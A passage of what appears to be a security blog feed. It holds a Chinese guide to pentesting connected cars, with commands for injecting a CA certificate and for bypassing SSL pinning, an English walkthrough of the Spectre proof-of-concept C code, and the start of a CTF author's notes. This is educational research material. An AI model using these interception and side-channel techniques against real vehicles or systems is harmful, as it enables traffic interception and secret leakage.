攻击面</span></h2><p>车机本身可以看作一个车辆上的安卓手机，其上运行了多个应用，这些应用会分别使用到蓝牙、Wifi、USB等接口，而这又不免与安卓内核进行交互。同时车机还会直接向 CAN 总线发起车控指令，因此重点在于车机上的应用安全、系统和硬件安全的防护。</p><p>同时，车机上还存在登录功能，用户可以通过登录已绑定的账号来通过手机对车辆进行控制，这也需要我们进行测试。</p><p>总结攻击面如下：</p><ul><li>APP 应用本身的漏洞</li><li>通信方式实现及其协议栈的漏洞</li><li>安卓系统的漏洞</li></ul><h2><span id="tbox-攻击面">TBOX 攻击面</span></h2><p>TBOX 集成了与 TSP 和用户移动端的通信，并且也涉及到 OTA 固件升级，可以说是整个体系中通信的桥梁。同时由于使用的是 linux 系统，也存在系统安全的问题。</p><h2><span id="tsp-云端攻击面">TSP 云端攻击面</span></h2><p>主要在于云端暴露的接口，我们可以通过这些接口来测试云端提供的功能有没有能导致越权等非法操作的漏洞。一般测试方法是通过分析车端或手机端对 TSP 信息的解析方式来分析消息内容，在需要时需要构造数据进行黑盒测试。由于本人在测试过程中接触该方面较少，这部分暂时略去。</p><h1><span id="测试步骤及遇到的问题">测试步骤及遇到的问题</span></h1><h2><span id="手机-app-测试">手机 APP 测试</span></h2><h3><span id="脱壳">脱壳</span></h3><p>首先 release 版本的 APP 可能会有壳。最佳方案是通过工具将 APP 脱壳。（不建议在测试项目进行中自己手脱，学习成本较高且容易拖慢整体进度，可以下来自己学习一下）</p><p>在此之前可以先学一下基本的加壳原理，以及识别壳的方式，可以参考<a href="https://cloud.tencent.com/developer/article/1696434">这篇文章</a>。</p><p>本次威马测试中，通过 <code>apktool</code> 解包 apk 查看 native-lib 库，可以发现存在<code>百度加固</code>的特征 native 库。这是一种比较早的壳，可以用 <a href="https://github.com/GuoQiang1993/Frida-Apk-Unpack">Frida-Apk-Unpack</a> 脱掉。脱出的 <code>dex</code> 文件将保存在 <code>/data/data/&lt;包名&gt;/</code> 目录下。需要注意的是，这个工具脱第一代壳的效果比较好，但是对于二代及之后的壳较差。对于二代壳可尝试通过 <a href="https://github.com/hanbinglengyue/FART.git">FART</a> 进行破解。</p><h3><span id="安卓抓包">安卓抓包</span></h3><p>在审代码的时候推荐根据应用的特征和接口来定位重点函数。这需要结合抓取的网络包与反汇编代码来分析。比如点击登录按钮，手机端会向云端 <code>xxx/Login</code> 接口发送请求，那么我们在分析的时候就可以先定位 <code>xxx/Login</code> 在 APP 中被引用的位置，从而定位到登录的主要逻辑。</p><p>手机端的抓包推荐使用 <code>burpsuite</code> 安装证书的方式，具体操作流程可参考  <a href="https://portswigger.net/support/installing-burp-suites-ca-certificate-in-an-android-device">burpsuite 官方文档</a>。</p><p>证书安装完成后，点击如下按钮可以选择开启或关闭数据包阻断。开启阻断后必须手动选择 <code>Forward</code> 或者 <code>Drop</code> 当前数据包。<br><img src="pic2.png" alt="pic2"></p><p>上述方式简单直接，并且抓到的数据包能够很清晰的看出其 <code>http</code> 结构。但是保护完善的 APK 一般都会开启 <a href="https://www.thesslstore.com/blog/an-introduction-to-pinning/">SSL Pinning</a>，这会导致即使安装了 <code>burpsuite</code> 证书也无法抓到从该 <code>APK</code> 发出的 <code>https</code> 报文。一般这种情况我们可以使用 <code>frida</code> 框架从应用的层面抓获未经过 <code>SSL</code> 加密的数据包。这里推荐 <a href="https://github.com/r0ysue/r0capture">r0capture</a> 工具，可以捕获目前安卓版本中几乎所有的数据包。最终会把抓包的信息保存为 <code>.pcap</code> 文件，可以用 <code>wireshark</code> 打开分析。</p><h3><span id="动态调试">动态调试</span></h3><p>安卓下的动态调试可以大致分为 <code>.so</code> 文件的动态调试和 <code>apk</code> 本身的动态调试。</p><p>对于调试 <code>apk</code> ，可以直接使用 <code>JEB</code> 的动态调试功能，测试机打开网络调试或 USB 调试功能即可。但这种方式由于设备本身数据传输的问题，响应较慢，且效率不高。另一种方是通过 <code>frida hook</code> 的方式来 hook 一些关键函数的参数及返回值，来达到更高效率的信息收集。这里推荐 <a href="https://www.anquanke.com/post/id/197657">objection</a> 工具，该工具集成了一些通用的 <code>frida</code> 功能，能够更方便我们调用一些 hook 功能。</p><p>如果需要调试 <code>.so</code> 文件，可以尝试使用 <code>IDA</code> 中的动态调试功能，具体操作步骤如下：</p><ol><li>将 <code>IDA</code> 安装目录下的 <code>dbgsrv/android_server</code> 通过 <code>adb</code> 传进测试机的 <code>/data/local/tmp</code> 目录下，给予相应执行权限并运行。</li><li>pc 中打开控制台，进行 adb 端口转发：<code>adb forward tcp:23946 tcp:23946</code>。</li><li>测试机中打开 apk，将目标 <code>.so</code> 文件通过 <code>IDA</code> 打开，点击 <code>Debugger -&gt; Attach -&gt; Remote ARMLinux/Android debugger</code>，将 <code>ip:port</code> 设置为 <code>127.0.0.1:23946</code>。如果能够连接成功即可以看到测试机的进程表，选择 attach 到目标应用即可。</li></ol><h3><span id="重放">重放</span></h3><p>在分析代码流程、数据包分析结束后，就可以尝试作为中间人进行重放攻击了。前提条件是存在没有走 <code>SSL Pinning</code> 的攻击点，否则我们实际攻击时无法伪造证书，也就失去了重放的意义。</p><p>可以直接使用 <code>burpsuite</code> 的 <code>repeat</code> 功能修改一些字段后进行重放。也可以通过 frida 修改掉一些参数模拟重放的效果。</p><p>如果遇到了开启 <code>SSL Pinning</code> 的情况，而我们又不仅仅需要重放，还需要查看收到的结果，就需要考虑进行 <code>SSL Pinning Bypass</code>。如果你有一个装有 <code>Xposed</code> 框架的 root 机，最简单的方式是使用 <a href="https://github.com/ac-pm/SSLUnpinning_Xposed">SSL_Unpinning</a> 。其优点在于可以 hook 现有的几乎所有安卓应用，且非常稳定。缺点是需要 <code>Xposed</code> 的频繁重启。</p><h2><span id="hu-应用测试">HU 应用测试</span></h2><p>可以直接在一个局域网下进行 adb 网络调试。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb connect &lt;ip&gt;:&lt;port&gt;</span><br></pre></td></tr></table></figure><p>由于车机相比手机更笨重，不方便移动，为了便于调试可以用 <a href="https://github.com/barry-ran/QtScrcpy">QtScrcpy</a> 来远程连接到车机的屏幕，然后用鼠标点击触发一些功能。</p><p>之前也提到过，HU 面向用户一端使用的安卓系统，因此 HU 上的应用测试也多为对安卓应用的逆向。测试过程中我们重点关注的还是能否造成越权以及对中间人攻击的尝试。同时一些安卓系统已经爆出的提权 CVE 我们也需要在车机上测试，并给出修复建议。</p><p>另外，车机上由于需要和 TSP、Tbox 通信，有时会开放一些端口，这些端口能否被攻击者利用也应纳入到测试范围中。</p><h3><span id="hu-抓包">HU 抓包</span></h3><p>与安卓抓包的方式基本相似，不同的是 HU 上不一定提供了有图形界面的安装证书的方式，需要我们手动安装证书到证书目录下。</p><p>首先我们将 burpsuite 的证书以 <code>der</code> 或者 <code>cer</code> 后缀导出，并在 linux 环境下运行以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> openssl x509 -inform DER -subject_hash_old -<span class="keyword">in</span> cacert.cer | head -1</span></span><br><span class="line">9a5ba575</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat cacert.cer &gt; 9a5ba575.0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> openssl x509 -inform DER -text -<span class="keyword">in</span> cacert.cer -noout &gt;&gt; 9a5ba575.0</span></span><br><span class="line"></span><br><span class="line">adb push 9a5ba575.0 /data/local/tmp</span><br></pre></td></tr></table></figure><p>这里我们就将自己的证书 push 到了安卓设备上。接下来我们需要将证书安装到 <code>/system/etc/security/cacerts</code> 目录下。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cp -r /system/etc/security/cacerts/ /data/<span class="built_in">local</span>/tmp/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> chmod 644 9a5ba575.0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> chcon <span class="string">&#x27;u:object_r:system_file:s0&#x27;</span> 9a5ba575.0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> mount -o <span class="built_in">bind</span> /data/<span class="built_in">local</span>/tmp/cacerts /system/etc/security/cacerts</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> stop &amp; start</span></span><br></pre></td></tr></table></figure><h2><span id="tbox-测试">TBOX 测试</span></h2><p>连接到目标 TBOX 的方式有两种：</p><ul><li>通过给的 adb 调试线连接 PC 进行调试</li><li>在 HU 上编译一份 adb，HU 与 TBOX 物理连接，连接到 HU 上后通过 adb 连接到 TBOX。</li></ul><p>如果使用第二种方式，在动态调试时 debug server 开的端口需要通过 adb 进行两层端口转发。</p><p>在本项目中，Tbox 为 linux 系统，其运行的为 arm 架构的 elf，可以比较方便的用 <code>IDA</code> 打开进行反编译。默认情况下 TBOX 上会跑许多进程，这些进程之间通过 IPC 进程间通信来交换信息，每个进程的状态改变都有可能导致其他进程的状态修改。</p><h1><span id="总结">总结</span></h1><ul><li>通常会将手机端和车端联合起来测试，最好有一台 root 的测试机比较方便。</li><li>本次项目中对固件相关的内容接触较少，空余时间可以补充一下。</li><li>安卓 Frida 可实现许多项目中需要的功能，可以考虑自己实现一些便于调试的框架（如 Hook 后多次自动重放等）。</li><li>安卓底层的一些机制，以及 IPC 通信之类的机制还需要补充。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;这篇文章主要介绍了自己在学习车联网安全渗透时从无到有的一系列过程，会从比较基础的车联网体系框架谈起。在自己的学习过程中并没有发现总结的比较全面且实用性强的入门总结，这让我前期测试时走了许多弯路，因此本篇的重点也会体现在各种场景下的实际操作。十分感谢</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Spectre and Cache</title>
    <link href="http://example.com/2021/02/22/Spectre%20and%20Cache/"/>
    <id>http://example.com/2021/02/22/Spectre%20and%20Cache/</id>
    <published>2021-02-22T09:09:43.420Z</published>
    <updated>2021-03-12T02:55:46.247Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#resources">Resources</a></li><li><a href="#cache">Cache</a></li><li><a href="#branch-prediction-and-speculative-execution">Branch Prediction and Speculative Execution</a></li><li><a href="#how-does-poc-work">How does PoC work?</a></li><li><a href="#postscript">Postscript</a></li></ul><!-- tocstop --><h1><span id="resources">Resources</span></h1><ul><li><a href="https://www.freebuf.com/column/161135.html">https://www.freebuf.com/column/161135.html</a></li><li><a href="https://bbs.pediy.com/thread-230310.htm#msg_header_h1_0">https://bbs.pediy.com/thread-230310.htm#msg_header_h1_0</a></li><li><a href="https://github.com/Eugnis/spectre-attack">https://github.com/Eugnis/spectre-attack</a></li></ul><h1><span id="cache">Cache</span></h1><p>We all know that it takes much time when CPU accessing memory considering CPU caculation speed. In order to reduce the large amount of time consumption caused by CPU access, <code>cache</code> arised. </p><p><strong>This article will not introduce the exact structure of memory, if you get interested in it, please refer to <a href="https://en.wikipedia.org/wiki/Cache_(computing)">this</a>.</strong></p><p>Let’s assume that our computer will do this operation:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmp = Array[x];</span><br></pre></td></tr></table></figure><p>CPU is trying to get <code>Array[x]</code> from cache first instead of memory, and here are two situations:</p><ol><li><code>Array[x]</code> is in the cache, so CPU gets its value.</li><li><code>Array[x]</code> is not in the cache, so CPU needs to access memory to get its value, which will cost more time.</li></ol><h1><span id="branch-prediction-and-speculative-execution">Branch Prediction and Speculative Execution</span></h1><p>Modern CPUs are multi-core and multi-threaded, that is, support parallel execution of instructions. Therefore, if there is a branch jump condition that is related to a data, but the cache does not hit the data and can only perform the memory fetch operation, the program will not serially block to wait for the end of the memory fetch to perform the branch jump, but will attempt to perform branch prediction and speculative execution. When the memory data read by the CPU comes back, the CPU then confirms according to the content of the data and the logic of the branch condition whether its speculative execution is valid, and if it is invalid, the calculation result is discarded and restored to the previous state. If effective, continue execution, which greatly improves the efficiency of the CPU.</p><p>But here is the thing: If the result of speculative execution is discarded, the code executed during speculative execution may still affect the CPU cache. When the CPU is restoring the state, the cache will not be restored, and the CPU will only restore the state of the related registers.</p><p>Let’s look at this demo:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// a1_size and a2 are not in the cache</span></span><br><span class="line"><span class="keyword">if</span> (idx &lt; a1_size) &#123;</span><br><span class="line">    tmp = a2[a1[idx]];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In the demo above, CPU knows that it is a conditional judgment, and because <code>a1_size</code> is not in the cache, CPU needs to access memory to get the value.</p><p>Then, CPU saves a checkpoint, and executes instructions behind speculatively, which means that CPU treats <code>idx</code> as a variable that is smaller than <code>a1_size</code>. If <code>idx</code> is large enough, it will cause OOB reading, and <code>a1[idx]</code> will be treated as an index of <code>a2</code> and CPU will access memory based on <code>a1[idx]</code>. Finally accessed data in <code>a2</code> will be submitted from the memory to the CPU cache.</p><p>When <code>a1_size</code> is read from the memory, the CPU checks the branch condition again, and it finds that it does not meet the condition and cannot continue execution. So it will discard the current calculation result, then restore to the previous state, and continue to execute the code of another branch. But the data in <code>a2</code> has been submitted to the CPU cache.</p><p>The demo may be a little bit different from real <a href="https://github.com/Eugnis/spectre-attack">PoC</a>, but it’s easier for us to understand.</p><h1><span id="how-does-poc-work">How does PoC work?</span></h1><p>The content we want to leak is defined:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* secret = <span class="string">&quot;The Magic Words are Squeamish Ossifrage.&quot;</span>;</span><br></pre></td></tr></table></figure><p><code>malicious_x</code> is the shift of <code>secret</code> relative to <code>array1</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> malicious_x = (<span class="keyword">size_t</span>)(secret - (<span class="keyword">char</span> *)array1); <span class="comment">/* default for malicious_x */</span></span><br></pre></td></tr></table></figure><hr><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> score[<span class="number">2</span>], len = <span class="built_in">strlen</span>(secret);</span><br><span class="line"><span class="keyword">uint8_t</span> value[<span class="number">2</span>];</span><br></pre></td></tr></table></figure><ul><li><p><code>value[0]</code> stores the character with the highest hit (the most likely character)</p></li><li><p><code>value[1]</code> stores the character with the second highest hit</p></li><li><p><code>score[0]</code> stores the number of hits with the highest character</p></li><li><p><code>score[1]</code> stores the number of hits for the second highest character</p></li></ul><p>Guess the data byte by byte:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (--len &gt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Reading at malicious_x = %p... &quot;</span>, (<span class="keyword">void</span> *)malicious_x);</span><br><span class="line">readMemoryByte(malicious_x++, value, score);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s: &quot;</span>, (score[<span class="number">0</span>] &gt;= <span class="number">2</span> * score[<span class="number">1</span>] ? <span class="string">&quot;Success&quot;</span> : <span class="string">&quot;Unclear&quot;</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%02X=&#x27;%c&#x27; score=%d &quot;</span>, value[<span class="number">0</span>],</span><br><span class="line">       (value[<span class="number">0</span>] &gt; <span class="number">31</span> &amp;&amp; value[<span class="number">0</span>] &lt; <span class="number">127</span> ? value[<span class="number">0</span>] : <span class="string">&#x27;?&#x27;</span>), score[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">if</span> (score[<span class="number">1</span>] &gt; <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;(second best: 0x%02X=&#x27;%c&#x27; score=%d)&quot;</span>, value[<span class="number">1</span>],</span><br><span class="line">   (value[<span class="number">1</span>] &gt; <span class="number">31</span> &amp;&amp; value[<span class="number">1</span>] &lt; <span class="number">127</span> ? value[<span class="number">1</span>] : <span class="string">&#x27;?&#x27;</span>),</span><br><span class="line">   score[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Let’s look inside <code>readMemoryByte</code> to see what happens.</p><p>In this function, we will try 1000 times to guess the answer, and break if the confidence condition is met:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (results[j] &gt;= (<span class="number">2</span> * results[k] + <span class="number">5</span>) || (results[j] == <span class="number">2</span> &amp;&amp; results[k] == <span class="number">0</span>))</span><br><span class="line"><span class="keyword">break</span>; <span class="comment">/* Clear success if best is &gt; 2*runner-up + 5 or 2/0) */</span></span><br></pre></td></tr></table></figure><p>At the beginning, we need to flush <code>array2</code> from cache:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">_mm_clflush(&amp;array2[i * <span class="number">512</span>]); <span class="comment">/* intrinsic for clflush instruction */</span></span><br></pre></td></tr></table></figure><p>Then there is another loop of 30 times. In this loop, it can be regarded as 5 6-cycles. The first 5 cycles are used to train the CPU, and then the conditional branch prediction is triggered for the last:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */</span></span><br><span class="line">training_x = tries % array1_size;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">29</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">&#123;</span><br><span class="line">_mm_clflush(&amp;array1_size);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">volatile</span> <span class="keyword">int</span> z = <span class="number">0</span>; z &lt; <span class="number">100</span>; z++)</span><br><span class="line">&#123;</span><br><span class="line">&#125; <span class="comment">/* Delay (can also mfence) */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */</span></span><br><span class="line"><span class="comment">/* Avoid jumps in case those tip off the branch predictor */</span></span><br><span class="line">x = ((j % <span class="number">6</span>) - <span class="number">1</span>) &amp; ~<span class="number">0xFFFF</span>; <span class="comment">/* Set x=FFF.FF0000 if j%6==0, else x=0 */</span></span><br><span class="line">x = (x | (x &gt;&gt; <span class="number">16</span>)); <span class="comment">/* Set x=-1 if j%6=0, else x=0 */</span></span><br><span class="line">x = training_x ^ (x &amp; (malicious_x ^ training_x));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        j % 6 == 0 -&gt; x = malicious_x</span></span><br><span class="line"><span class="comment">        j % 6 != 0 -&gt; x = training_x</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Call the victim! */</span></span><br><span class="line">victim_function(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>After these 30 cycles, through side-channel attacks, the access time of each item in <code>array2</code> is counted, and the ASCII value of the string is deduced:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Time reads. Order is lightly mixed up to prevent stride prediction */</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">mix_i = ((i * <span class="number">167</span>) + <span class="number">13</span>) &amp; <span class="number">255</span>;</span><br><span class="line">addr = &amp;array2[mix_i * <span class="number">512</span>];</span><br><span class="line">time1 = __rdtscp(&amp;junk); <span class="comment">/* READ TIMER */</span></span><br><span class="line">junk = *addr; <span class="comment">/* MEMORY ACCESS TO TIME */</span></span><br><span class="line">time2 = __rdtscp(&amp;junk) - time1; <span class="comment">/* READ TIMER &amp; COMPUTE ELAPSED TIME */</span></span><br><span class="line"><span class="keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD &amp;&amp; mix_i != array1[tries % array1_size])</span><br><span class="line">results[mix_i]++; <span class="comment">/* cache hit - add +1 to score for this value */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>At last, we need to find the highest and second highest results:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Locate highest &amp; second-highest results results tallies in j/k */</span></span><br><span class="line">j = k = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (j &lt; <span class="number">0</span> || results[i] &gt;= results[j])</span><br><span class="line">&#123;</span><br><span class="line">k = j;</span><br><span class="line">j = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (k &lt; <span class="number">0</span> || results[i] &gt;= results[k])</span><br><span class="line">&#123;</span><br><span class="line">k = i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>As for <code>victim_function</code>, it’s similiar to the demo mentioned above:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint8_t</span> temp = <span class="number">0</span>; <span class="comment">/* Used so compiler won&#x27;t optimize out victim_function() */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">victim_function</span><span class="params">(<span class="keyword">size_t</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (x &lt; array1_size) <span class="comment">// bound check</span></span><br><span class="line">&#123;</span><br><span class="line">temp &amp;= array2[array1[x] * <span class="number">512</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The first 5 cycles are essentially a kind of training for the CPU. Therefore, when the branch judgment of the sixth cycle causes speculative execution, the CPU is more inclined to choose the “no cross-border” branch, and therefore speculative execution. After the boundary check fails, the speculative execution result is discarded, but the value of <code>array2[array1[x] * 512]</code> has been stored in the cache. When reading the content of <code>array2[mix_t * 512]</code>, if you find that the reading time is abnormally fast, you can determine that <code>mix_t</code> is the answer.</p><h1><span id="postscript">Postscript</span></h1><p><code>CPU Spectre</code> is a novel cache-level attack method. However, this attack method also has its limitations, that is, the attacker needs to have a greater degree of freedom in the entire memory allocation and process control, and it is difficult to find such an exploit at the application level.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#resources&quot;&gt;Resources&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#cache&quot;&gt;Cache&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#branch-prediction-and-specu</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>AntCTF x D^3CTF 2021</title>
    <link href="http://example.com/2021/02/20/d3ctf%202021/d3ctf%202021/"/>
    <id>http://example.com/2021/02/20/d3ctf%202021/d3ctf%202021/</id>
    <published>2021-02-20T09:36:00.469Z</published>
    <updated>2021-03-12T10:37:47.770Z</updated>
    
    <content type="html"><![CDATA[<p><em>I am honored to be one of the questioners of <code>AntCTF x D^3CTF 2021</code>.<br>In this competition, I came up with 2 pwnable challenges, and tested several pwnable challenges.</em></p><p><em>This article records my experience before and after the question, as well as some lessons.</em></p><!-- toc --><ul><li><a href="#before-the-competition">Before the competition</a><ul><li><a href="#disappeared-d3ctf-2020">Disappeared D3CTF 2020</a></li><li><a href="#upcoming-d3ctf-2021">Upcoming D3CTF 2021</a><ul><li><a href="#kernel-pwn-with-fine-grained-kaslr-and-jit-rop">kernel pwn with fine-grained kaslr and JIT-ROP</a></li><li><a href="#php-extension-and-php-uaf">php extension and php UAF</a></li><li><a href="#qemu-escape">qemu escape</a></li><li><a href="#tsx">TSX</a></li></ul></li></ul></li><li><a href="#after-the-game-and-writeups">After the game and Writeups</a><ul><li><a href="#hackphp">Hackphp</a><ul><li><a href="#preview">Preview</a></li><li><a href="#type-confusion-in-php">Type-confusion in PHP</a></li><li><a href="#details">Details</a></li><li><a href="#exp">exp</a></li></ul></li><li><a href="#liproll">Liproll</a><ul><li><a href="#exp-1">exp</a></li></ul></li></ul></li></ul><!-- tocstop --><h1><span id="before-the-competition">Before the competition</span></h1><h2><span id="disappeared-d3ctf-2020">Disappeared D3CTF 2020</span></h2><p>There should be <code>D3CTF 2020</code> last year, but it was cancelled for some reasons. </p><p>At that time I was conceiving a challenge about <code>kernel pwn</code> and <code>integer overflow</code>, which originated from <code>CVE-2017-16995</code>, a <code>eBPF-related</code> vulnerability. I designed a VM inside the vulnerable kernel module, and due to the symbol asymmetry when comparing operands, it led to cross-border access.</p><p>But it was to hard to be debugged, as well as the exploit… And the most important thing is, the challenge itself is not novel enough, which is contrary to the theme of this competition.</p><p>The cancellation of <code>D3CTF 2020</code> is very regrettable, however, it gave me a chance to calm down, and learn more things to conceived better questions.</p><h2><span id="upcoming-d3ctf-2021">Upcoming D3CTF 2021</span></h2><p>Thanks to the support from <code>Ant Security</code> and the cooperation of <code>Vidar-team, L-team and CNSS</code>, <code>AntCTF x D^3CTF 2021</code> will arise in March, 2021. And I think it’s time for me to settle down the challenges in the competition.</p><p>I decided to come up some challenges based on the points listed below:</p><h3><span id="kernel-pwn-with-fine-grained-kaslr-and-jit-rop">kernel pwn with fine-grained kaslr and JIT-ROP</span></h3><p>A <a href="https://ctftime.org/task/14383">challenge</a> in <code>hxpctf 2020</code> inspired me.</p><p>In this challenge, the functions were in seperate sections. We couldn’t know the real function offset because each section was loaded into memory independently every time we start the kernel, which means that it is impossible for us to find gadgets in static environment. The official write-up told us that we can use <code>.symtab</code> section, a symbol table used to store information about functions and global variables that are defined and referenced in the program, to get the exact function addresss.</p><p>After solving the challenge, I was wondering if there is any other way to reach the root shell instead of using <code>.symtab</code> section to caculate the real offsets of the functions needed. And I notice that if <code>memory leak vulnerability</code> exists, we can use <code>JIT-ROP</code>, or some tricks like that, to find the real gadgets’ address. </p><h3><span id="php-extension-and-php-uaf">php extension and php UAF</span></h3><p>Months ago, my teammates <code>@ccdragon and @eniv</code> helped me to debug a <a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">php uaf exploit</a>, and I learned a lot php debug skills from that.</p><p>As there are few challenges about php extension in <code>ctf-pwn</code>, I decided to construct a vulnerability in php extension. It’s going to be a attractive challenge, I think.</p><h3><span id="qemu-escape">qemu escape</span></h3><p>Honestly, I am interested in this kind of problem, but I don’t have any new ideas about qemu escape challenge.</p><h3><span id="tsx">TSX</span></h3><p>A problem from <code>defcon 2019</code> attracted me a lot. You can refer to <a href="http://blog.ret2.io/2019/06/26/attacking-intel-tsx/#transactional-jailing">this blog</a> to explore more.</p><p>It’s a novel and CPU-level attack, and our goal is to release the lock to escape the transaction, and finally execute our shellcode.</p><p>But the thing is, as the blog mentioned above states, due to the unique scenario modeled by this CTF challenge, it is unlikely that this issue poses a risk to real-world applications, and what’s more, the uniqueness of this attack method also determines that it is difficult to construct new attack ideas.</p><h1><span id="after-the-game-and-writeups">After the game and 